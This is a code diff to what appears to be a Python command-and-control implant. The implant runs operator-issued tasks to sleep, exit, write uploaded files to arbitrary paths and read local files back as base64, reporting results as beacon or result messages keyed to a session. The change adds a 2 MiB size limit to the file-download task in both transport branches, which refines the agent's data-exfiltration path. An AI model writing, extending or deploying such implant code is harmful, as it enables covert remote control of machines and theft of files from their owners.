@@ -224,7 +224,10 @@ if MODE=='http':
      elif t['type']=='sleep':C['interval']=int(t.get('arg') or 5)
      elif t['type']=='exit':raise SystemExit
      elif t['type']=='upload':open(t['path'],'wb').write(base64.b64decode(t.get('data') or ''));out='uploaded'
-     elif t['type']=='download':out=base64.b64encode(open(t['path'],'rb').read(2097153)).decode()
+     elif t['type']=='download':
+      data=open(t['path'],'rb').read(2097153)
+      if len(data)>2097152:raise ValueError('download exceeds 2 MiB')
+      out=base64.b64encode(data).decode()
     except Exception as e:er=str(e)
     res.append({'id':t['id'],'output':out,'error':er,'status':'failed' if er else 'success'})
    if res:
@@ -261,7 +264,10 @@ else:
       elif t['type']=='sleep':C['interval']=int(t.get('arg') or 5)
       elif t['type']=='exit':raise SystemExit
       elif t['type']=='upload':open(t['path'],'wb').write(base64.b64decode(t.get('data') or ''));out='uploaded'
-      elif t['type']=='download':out=base64.b64encode(open(t['path'],'rb').read(2097153)).decode()
+      elif t['type']=='download':
+       data=open(t['path'],'rb').read(2097153)
+       if len(data)>2097152:raise ValueError('download exceeds 2 MiB')
+       out=base64.b64encode(data).decode()
      except Exception as e:er=str(e)
      res.append({'id':t['id'],'output':out,'error':er,'status':'failed' if er else 'success'})
     rm={'type':'result','session_id':msg.get('session_id'),'results':res} if res else {'type':'beacon','session_id':msg.get('session_id')}
